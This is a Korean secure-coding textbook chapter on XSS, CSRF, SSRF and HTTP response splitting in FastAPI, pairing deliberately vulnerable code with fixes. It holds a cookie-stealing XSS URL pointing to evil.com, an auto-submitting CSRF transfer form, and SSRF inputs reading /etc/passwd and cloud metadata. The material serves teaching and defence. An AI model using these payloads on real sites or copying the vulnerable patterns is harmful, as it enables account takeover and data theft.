# Chapter 04. 웹 요청을 노리는 공격

## 4-1. 크로스사이트 스크립트(XSS)

### 개요

크로스사이트 스크립트(Cross-Site Scripting, XSS)는 웹 보안에서 가장 빈번하게 발생하는 취약점 중 하나입니다. 공격자가 웹 애플리케이션에 악성 스크립트(Script)를 삽입하여, 해당 페이지를 방문하는 다른 사용자의 브라우저에서 악성 코드가 실행되도록 만드는 공격입니다.

바이브 코딩(Vibe Coding)으로 웹사이트를 만들 때, 사용자 입력을 화면에 출력하는 기능은 거의 모든 웹사이트에 존재합니다. 게시판, 댓글, 프로필, 검색 결과 등 어디서든 XSS 취약점이 발생할 수 있으므로, 여러분이 만드는 모든 웹페이지에서 이 취약점을 반드시 확인해야 합니다.

### 왜 위험한가

XSS 공격이 성공하면 공격자는 피해자의 브라우저에서 자바스크립트(JavaScript)를 실행할 수 있습니다:

- **세션 탈취**: `document.cookie`를 통해 로그인 세션을 훔쳐 계정을 장악합니다
- **키로깅(Keylogging)**: 사용자의 키보드 입력을 기록하여 비밀번호를 탈취합니다
- **피싱**: 가짜 로그인 폼을 삽입하여 사용자 인증 정보를 수집합니다
- **악성코드 배포**: 방문자의 브라우저를 통해 악성 프로그램을 다운로드시킵니다
- **웹사이트 변조**: 페이지 내용을 임의로 수정하여 가짜 정보를 표시합니다

XSS 공격은 세 가지 유형으로 분류됩니다:

**유형 1 — 반사형 XSS(Reflected XSS)**

공격 스크립트가 URL 등의 요청에 포함되어 서버 응답에 그대로 반사(Reflected)되는 방식입니다. 공격자는 악성 스크립트가 포함된 링크를 피해자에게 전송하고, 피해자가 해당 링크를 클릭하면 스크립트가 실행됩니다.

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**유형 2 — 저장형 XSS(Stored XSS)**

공격 스크립트가 서버의 데이터베이스에 저장되어, 해당 데이터를 조회하는 모든 사용자에게 영향을 미치는 방식입니다. 게시판, 댓글, 프로필 페이지 등이 대표적인 공격 대상입니다. 반사형보다 훨씬 위험한 이유는 **한 번의 공격으로 다수의 피해자**가 발생하기 때문입니다.

**유형 3 — DOM 기반 XSS(DOM XSS)**

서버를 거치지 않고 클라이언트 측 자바스크립트에서 DOM(Document Object Model)을 조작하여 발생하는 XSS입니다. URL의 해시(#) 값이나 `location.search` 등을 통해 전달된 데이터가 검증 없이 DOM에 삽입될 때 발생합니다.

```javascript
// 위험한 DOM 조작의 예
document.getElementById('output').innerHTML = location.hash.substring(1);
```

### 취약한 코드

#### ❌ 취약한 코드: Jinja2 autoescape 비활성화

```python
from fastapi import FastAPI, Form, Request
from fastapi.templating import Jinja2Templates
from jinja2 import Environment, FileSystemLoader

app = FastAPI()

# autoescape=False로 설정하면 XSS 공격에 노출됩니다
env = Environment(loader=FileSystemLoader("templates"), autoescape=False)
templates = Jinja2Templates(directory="templates")
templates.env = env

@app.post("/profile-link")
async def profile_link(request: Request, profile_url: str = Form(...), profile_name: str = Form(...)):
    # 외부 입력값을 검증 없이 HTML 태그 생성에 사용
    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    return templates.TemplateResponse(
        "my_profile.html", {"request": request, "object_link": object_link}
    )
```

#### ❌ 취약한 코드: Jinja2 템플릿에서 safe 필터 오용

```html
<!doctype html>
<html>
<body>
    <div class="content">
        <!-- autoescape false 블록으로 XSS 보호를 해제합니다 -->
        {% autoescape false %}
        {{ content }}
        {% endautoescape %}
    </div>
    <div class="content2">
        <!-- safe 필터도 XSS 보호를 해제합니다 -->
        {{ content | safe }}
    </div>
</body>
</html>
```

> **⚠️ 주의:** AI 도구에 "HTML 태그가 그대로 보여야 해"라고 요청하면 `| safe` 필터나 `autoescape false`를 사용하는 코드가 생성될 수 있습니다. 이는 XSS 보호를 완전히 해제하는 것이므로 매우 위험합니다.

#### ❌ 취약한 코드: HTMLResponse로 직접 HTML 생성

```python
from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(search_keyword: str = Query(...)):
    # 사용자의 입력을 검증이나 치환 없이 HTML에 직접 삽입합니다
    return f"""
    <html>
    <body>
        <p>검색어: {search_keyword}</p>
    </body>
    </html>
    """
```

#### ❌ 취약한 코드: JavaScript에서의 DOM XSS

```html
<script>
// URL 파라미터를 그대로 DOM에 삽입하면 XSS가 발생합니다
const params = new URLSearchParams(window.location.search);
const keyword = params.get('q');

// innerHTML은 HTML을 파싱하므로 스크립트가 실행될 수 있습니다
document.getElementById('search-result').innerHTML =
    '검색어: ' + keyword;
</script>
```

### 안전한 코드

#### ✅ 안전한 코드: Jinja2 기본 autoescape 활성화

```python
from fastapi import FastAPI, Form, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
# Jinja2Templates는 기본적으로 .html 파일에 대해 autoescape가 활성화됩니다
templates = Jinja2Templates(directory="templates")

@app.post("/profile-link")
async def profile_link(request: Request, profile_url: str = Form(...), profile_name: str = Form(...)):
    # 템플릿에서 자동 이스케이프가 적용되므로
    # HTML 태그는 문자열 그대로 표시됩니다
    return templates.TemplateResponse(
        "my_profile.html", {
            "request": request,
            "profile_url": profile_url,
            "profile_name": profile_name,
        }
    )
```

```html
<!-- templates/my_profile.html -->
<!-- Jinja2의 자동 이스케이프가 XSS를 방지합니다 -->
<a href="{{ profile_url }}">{{ profile_name }}</a>
```

#### ✅ 안전한 코드: Jinja2 템플릿에서 autoescape 유지

```html
<!doctype html>
<html>
<body>
    <div class="content">
        {% autoescape true %}
        <!-- autoescape true로 XSS 공격을 방지합니다 -->
        {{ content }}
        {% endautoescape %}
    </div>
    <div class="content2">
        <!-- safe 필터를 사용하지 않습니다 -->
        {{ content }}
    </div>
</body>
</html>
```

> **💡 팁:** FastAPI의 `Jinja2Templates`는 기본적으로 `.html`, `.htm`, `.xml` 확장자에 대해 `autoescape`가 활성화되어 있습니다. 특별한 이유가 없다면 이 설정을 변경하지 마십시오. `Jinja2` 환경을 커스텀 생성할 때 `autoescape=False`로 설정하면 보호가 해제되므로 주의하십시오.

#### ✅ 안전한 코드: html.escape() 사용

```python
import html
from fastapi import FastAPI, Form, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.post("/search")
async def search(request: Request, search_keyword: str = Form(...)):
    # HTML 엔티티 코드로 치환하여 스크립트 실행을 방지합니다
    escape_keyword = html.escape(search_keyword)
    return templates.TemplateResponse(
        "search.html", {"request": request, "search_keyword": escape_keyword}
    )
```

`html.escape()`는 `&`, `<`, `>`, `"`, `'` 등의 특수문자를 `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`로 변환합니다.

#### ✅ 안전한 코드: JavaScript에서 textContent 사용

```html
<script>
const params = new URLSearchParams(window.location.search);
const keyword = params.get('q');

// textContent는 HTML을 파싱하지 않으므로 XSS에 안전합니다
document.getElementById('search-result').textContent =
    '검색어: ' + keyword;
</script>
```

> **💡 팁:** JavaScript에서 DOM을 조작할 때 `innerHTML` 대신 `textContent`를 사용하면 HTML 태그가 파싱되지 않아 XSS를 방지할 수 있습니다. HTML 구조를 동적으로 생성해야 하는 경우에는 `createElement()`와 `textContent`를 조합하십시오.

### 바이브 코딩 시 체크포인트

- [ ] **Jinja2 환경에서 `autoescape=False`를 설정하고 있지 않은가?** 이 설정은 XSS 보호를 해제합니다
- [ ] **템플릿에서 `| safe` 필터나 `{% autoescape false %}`를 사용하고 있지 않은가?**
- [ ] **`HTMLResponse`로 사용자 입력을 직접 포함한 HTML을 반환하고 있지 않은가?** 반드시 `Jinja2Templates`를 사용하십시오
- [ ] **JavaScript에서 `innerHTML`을 사용하고 있지 않은가?** `textContent`나 `createElement()`를 사용하십시오
- [ ] **사용자 입력이 HTML 속성에 들어가는 경우 따옴표로 감싸져 있는가?**
- [ ] **리치 텍스트 에디터(Rich Text Editor)를 사용하는 경우 서버 측 HTML 정화(Sanitization) 라이브러리를 적용했는가?** `bleach` 라이브러리 등을 사용하십시오

---

## 4-2. 크로스사이트 요청 위조(CSRF)

### 개요

크로스사이트 요청 위조(Cross-Site Request Forgery, CSRF)는 사용자가 인지하지 못한 상황에서, 공격자가 의도한 행위(데이터 수정, 삭제, 등록 등)를 사용자 명의로 수행하게 만드는 공격입니다.

사용자가 웹사이트에 로그인한 상태에서 공격자가 만든 악성 페이지를 방문하면, 해당 페이지에서 사용자의 인증 정보(쿠키)를 이용하여 원래 사이트에 요청을 보냅니다. 서버는 이 요청이 사용자 본인의 의도인지 구분할 수 없습니다.

### 왜 위험한가

CSRF 공격의 대표적인 시나리오를 살펴보겠습니다:

1. 여러분이 만든 쇼핑몰에 사용자가 로그인합니다
2. 사용자가 다른 탭에서 공격자의 웹페이지를 방문합니다
3. 공격자의 페이지에는 다음과 같은 숨겨진 폼이 있습니다:

```html
<!-- 공격자의 페이지에 숨겨진 폼 -->
<form action="https://your-shop.com/transfer" method="POST" id="evil-form">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

4. 사용자의 브라우저가 자동으로 로그인 쿠키를 포함하여 요청을 보냅니다
5. 서버는 정상 요청으로 판단하여 송금을 처리합니다

### 취약한 코드

#### ❌ 취약한 코드: CSRF 보호 미적용

```python
from fastapi import FastAPI, Form, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# CSRF 보호 미들웨어가 전혀 적용되지 않은 상태입니다
@app.post("/pay-to-point")
async def pay_to_point(
    request: Request,
    user_id: str = Form(...),
    pay: str = Form(...),
    product_info: str = Form(...),
):
    ret = handle_pay(user_id, pay, product_info)
    return templates.TemplateResponse(
        "view_wallet.html", {"request": request, "wallet": ret}
    )
```

#### ❌ 취약한 코드: 템플릿에서 CSRF 토큰 누락

```html
<!--html page-->
<form action="/pay-to-point" method="POST">
    <!-- form 태그 내부에 CSRF 토큰이 없습니다 -->
    <input type="text" name="user_id" />
    <input type="text" name="pay" />
    <input type="hidden" name="product_info" value="item_001" />
    <input type="submit"/>
</form>
```

> **⚠️ 주의:** AI 도구가 "403 Forbidden 에러가 나요"라는 질문에 대해 CSRF 미들웨어를 제거하라고 답변하는 경우가 있습니다. 이는 문제를 해결하는 것이 아니라 보안 기능을 무력화하는 것입니다.

### 안전한 코드

#### ✅ 안전한 코드: Starlette CSRF 미들웨어 적용

```python
from fastapi import FastAPI, Form, Request, Depends
from fastapi.templating import Jinja2Templates
from starlette_csrf import CSRFMiddleware

app = FastAPI()

# CSRF 보호 미들웨어를 적용합니다
app.add_middleware(
    CSRFMiddleware,
    secret="여러분의-비밀키-환경변수에서-불러오세요",
    required_urls=["/pay-to-point", "/transfer", "/checkout"],
    exempt_urls=["/api/webhook"],  # 웹훅 등 예외 URL
)

templates = Jinja2Templates(directory="templates")

@app.post("/pay-to-point")
async def pay_to_point(
    request: Request,
    user_id: str = Form(...),
    pay: str = Form(...),
    product_info: str = Form(...),
):
    ret = handle_pay(user_id, pay, product_info)
    return templates.TemplateResponse(
        "view_wallet.html", {"request": request, "wallet": ret}
    )
```

#### ✅ 안전한 코드: 커스텀 CSRF 토큰 구현

```python
import secrets
from fastapi import FastAPI, Form, Request, HTTPException, Depends
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware

app = FastAPI()
app.add_middleware(SessionMiddleware, secret_key="여러분의-비밀키")
templates = Jinja2Templates(directory="templates")

def generate_csrf_token(request: Request) -> str:
    """CSRF 토큰을 생성하고 세션에 저장합니다."""
    if "csrf_token" not in request.session:
        request.session["csrf_token"] = secrets.token_hex(32)
    return request.session["csrf_token"]

def verify_csrf_token(request: Request, csrf_token: str = Form(...)):
    """폼에서 전달된 CSRF 토큰이 세션의 토큰과 일치하는지 검증합니다."""
    session_token = request.session.get("csrf_token")
    if not session_token or not secrets.compare_digest(session_token, csrf_token):
        raise HTTPException(status_code=403, detail="CSRF 토큰이 유효하지 않습니다.")

@app.get("/pay-form")
async def pay_form(request: Request):
    token = generate_csrf_token(request)
    return templates.TemplateResponse(
        "pay_form.html", {"request": request, "csrf_token": token}
    )

@app.post("/pay-to-point")
async def pay_to_point(
    request: Request,
    user_id: str = Form(...),
    pay: str = Form(...),
    product_info: str = Form(...),
    _: None = Depends(verify_csrf_token),
):
    ret = handle_pay(user_id, pay, product_info)
    return templates.TemplateResponse(
        "view_wallet.html", {"request": request, "wallet": ret}
    )
```

#### ✅ 안전한 코드: 템플릿에 CSRF 토큰 포함

```html
<!-- templates/pay_form.html -->
<form action="/pay-to-point" method="POST">
    <!-- CSRF 토큰을 hidden input으로 포함합니다 -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
    <input type="text" name="user_id" />
    <input type="text" name="pay" />
    <input type="hidden" name="product_info" value="item_001" />
    <input type="submit"/>
</form>
```

> **💡 팁:** FastAPI에서 POST 요청 시 "403 Forbidden" 에러가 발생하면, CSRF를 비활성화하는 대신 폼에 CSRF 토큰 hidden input을 추가하십시오. 이것이 올바른 해결 방법입니다. AJAX 요청의 경우 `X-CSRF-Token` 헤더에 토큰을 포함하십시오.

### 바이브 코딩 시 체크포인트

- [ ] **CSRF 보호 미들웨어(`CSRFMiddleware` 또는 커스텀 구현)가 적용되어 있는가?**
- [ ] **모든 POST 폼에 CSRF 토큰이 hidden input으로 포함되어 있는가?**
- [ ] **특정 엔드포인트에 대해 CSRF 보호를 불필요하게 예외 처리하고 있지 않은가?**
- [ ] **AJAX 요청 시 CSRF 토큰을 헤더에 포함하고 있는가?**
- [ ] **세션 미들웨어(`SessionMiddleware`)가 설정되어 있는가?**

---

## 4-3. 서버사이드 요청 위조(SSRF)

### 개요

서버사이드 요청 위조(Server-Side Request Forgery, SSRF)는 공격자가 서버 측에서 다른 서버로 보내는 요청을 조작하여, 내부 네트워크의 자원에 접근하는 공격입니다.

바이브 코딩으로 외부 API를 호출하는 기능, URL 프리뷰(Preview) 기능, 웹훅(Webhook) 처리 등을 구현할 때 이 취약점에 노출될 수 있습니다.

### 왜 위험한가

SSRF는 공격자가 **서버의 신뢰된 네트워크 위치**를 악용하는 공격입니다:

- **내부 시스템 접근**: `http://192.168.0.45/admin`과 같이 외부에서 접근할 수 없는 관리자 페이지에 접근
- **클라우드 메타데이터 탈취**: `http://169.254.169.254/latest/meta-data/`로 AWS 인스턴스의 인증 키를 획득
- **내부 파일 열람**: `file:///etc/passwd`로 서버의 파일 시스템에 접근
- **포트 스캐닝**: 내부 네트워크의 서비스 구성을 파악

```
# 공격자의 입력 예시
http://example.com/api?url=http://192.168.0.45/member/list.json
http://example.com/api?url=file:///etc/passwd
http://example.com/api?url=http://169.254.169.254/latest/meta-data/
```

### 취약한 코드

#### ❌ 취약한 코드: 사용자 입력 URL로 HTTP 요청

```python
import httpx
from fastapi import FastAPI, Form, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.post("/call-third-party-api")
async def call_third_party_api(request: Request, address: str = Form(...)):
    # 사용자가 입력한 주소를 검증하지 않고 HTTP 요청을 보냅니다
    async with httpx.AsyncClient() as client:
        response = await client.get(address)

    return templates.TemplateResponse(
        "result.html", {"request": request, "result": response.text}
    )
```

### 안전한 코드

#### ✅ 안전한 코드: 허용 URL 화이트리스트 적용

```python
import httpx
from fastapi import FastAPI, Form, Request, HTTPException
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# 허용하는 서버 목록을 화이트리스트로 관리합니다
# DNS rebinding 공격 방지를 위해 도메인보다 IP 사용을 권장합니다
ALLOW_SERVER_LIST = [
    'https://127.0.0.1/latest/',
    'https://192.168.0.1/user_data',
    'https://192.168.0.100/v1/public',
]

@app.post("/call-third-party-api")
async def call_third_party_api(request: Request, address: str = Form(...)):
    # 화이트리스트에 포함된 URL만 허용합니다
    if address not in ALLOW_SERVER_LIST:
        raise HTTPException(status_code=400, detail="허용되지 않은 서버입니다.")

    async with httpx.AsyncClient() as client:
        response = await client.get(address, timeout=5.0)

    return templates.TemplateResponse(
        "result.html", {"request": request, "result": response.text}
    )
```

#### ✅ 안전한 코드: URL 파싱 후 검증

```python
import socket
import ipaddress
from urllib.parse import urlparse
import httpx
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, HttpUrl

app = FastAPI()

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # 클라우드 메타데이터
    ipaddress.ip_network('127.0.0.0/8'),     # 루프백
]

class URLRequest(BaseModel):
    # Pydantic의 HttpUrl 타입으로 URL 형식을 사전 검증합니다
    url: HttpUrl

async def safe_request(url: str) -> str:
    parsed = urlparse(url)

    # file:// 등의 위험한 프로토콜 차단
    if parsed.scheme not in ('http', 'https'):
        raise HTTPException(status_code=400, detail="허용되지 않은 프로토콜입니다.")

    # 내부 네트워크 IP 차단
    ip = socket.gethostbyname(parsed.hostname)
    for network in BLOCKED_NETWORKS:
        if ipaddress.ip_address(ip) in network:
            raise HTTPException(
                status_code=400, detail="내부 네트워크 접근은 허용되지 않습니다."
            )

    async with httpx.AsyncClient() as client:
        response = await client.get(url, timeout=5.0)
    return response.text

@app.post("/call-api")
async def call_api(body: URLRequest):
    result = await safe_request(str(body.url))
    return {"result": result}
```

> **💡 팁:** 클라우드 환경(AWS, GCP, Azure)에서는 메타데이터 서비스(169.254.169.254)에 대한 접근을 반드시 차단하십시오. 메타데이터를 통해 인스턴스의 IAM 역할 자격 증명이 탈취될 수 있습니다. FastAPI에서는 Pydantic의 `HttpUrl` 타입을 활용하면 URL 형식 검증을 자동화할 수 있습니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력 URL로 서버에서 HTTP 요청을 보내는 코드가 있는가?**
- [ ] **URL 화이트리스트 또는 내부 네트워크 차단이 적용되어 있는가?**
- [ ] **`file://`, `gopher://` 등 위험한 프로토콜이 차단되어 있는가?**
- [ ] **클라우드 메타데이터 IP(169.254.169.254)에 대한 접근이 차단되어 있는가?**
- [ ] **Pydantic의 `HttpUrl` 타입으로 URL 형식이 사전 검증되고 있는가?**

---

## 4-4. HTTP 응답 분할(HTTP Response Splitting)

### 개요

HTTP 응답 분할(HTTP Response Splitting)은 HTTP 응답 헤더에 사용자 입력값이 포함될 때, 해당 입력에 개행문자(CR: `\r`, LF: `\n`)가 존재하면 HTTP 응답이 두 개 이상으로 분리되는 취약점입니다. 공격자는 이를 이용하여 두 번째 응답에 악성 코드를 주입할 수 있습니다.

### 왜 위험한가

응답 헤더가 분할되면 공격자가 완전히 새로운 HTTP 응답을 만들어낼 수 있습니다. 이를 통해 XSS 공격이나 캐시 훼손(Cache Poisoning) 공격이 가능합니다.

### 취약한 코드

#### ❌ 취약한 코드: 외부 입력을 응답 헤더에 직접 사용

```python
from fastapi import FastAPI, Form
from fastapi.responses import Response

app = FastAPI()

@app.post("/route")
async def route(content_type: str = Form(...)):
    # 외부 입력값을 검증 없이 응답 헤더에 포함합니다
    return Response(
        content="OK",
        headers={"Content-Type": content_type}
    )
```

### 안전한 코드

#### ✅ 안전한 코드: 개행문자 제거

```python
from fastapi import FastAPI, Form
from fastapi.responses import Response

app = FastAPI()

@app.post("/route")
async def route(content_type: str = Form(...)):
    # 응답 헤더에 포함될 수 있는 개행문자를 제거합니다
    content_type = content_type.replace('\r', '').replace('\n', '')

    return Response(
        content="OK",
        headers={"Content-Type": content_type}
    )
```

#### ✅ 더 안전한 코드: Pydantic으로 헤더 값 검증

```python
import re
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, field_validator

app = FastAPI()

class HeaderRequest(BaseModel):
    content_type: str

    @field_validator("content_type")
    @classmethod
    def validate_content_type(cls, v: str) -> str:
        # 개행문자가 포함되어 있으면 거부합니다
        if re.search(r'[\r\n]', v):
            raise ValueError("헤더 값에 개행문자를 포함할 수 없습니다.")
        # 허용된 Content-Type 패턴만 승인합니다
        allowed_types = ['text/html', 'text/plain', 'application/json', 'application/xml']
        if v not in allowed_types:
            raise ValueError("허용되지 않은 Content-Type입니다.")
        return v

@app.post("/route")
async def route(body: HeaderRequest):
    from fastapi.responses import Response
    return Response(
        content="OK",
        headers={"Content-Type": body.content_type}
    )
```

> **💡 팁:** 최신 버전의 FastAPI와 Starlette는 응답 헤더에서 개행문자를 자동으로 처리하는 보호 기능이 내장되어 있습니다. 하지만 프레임워크의 보호에만 의존하지 말고, 응답 헤더에 사용되는 외부 입력값은 항상 검증하는 습관을 가지십시오. 프레임워크와 라이브러리를 항상 최신 버전으로 유지하는 것도 중요합니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력값이 HTTP 응답 헤더(Set-Cookie, Content-Type, Location 등)에 포함되고 있지 않은가?**
- [ ] **불가피하게 포함되는 경우 `\r`, `\n` 개행문자가 제거되고 있는가?**
- [ ] **Pydantic 모델로 헤더에 사용될 값을 사전 검증하고 있는가?**
- [ ] **FastAPI, Starlette 등 프레임워크가 최신 버전인가?**
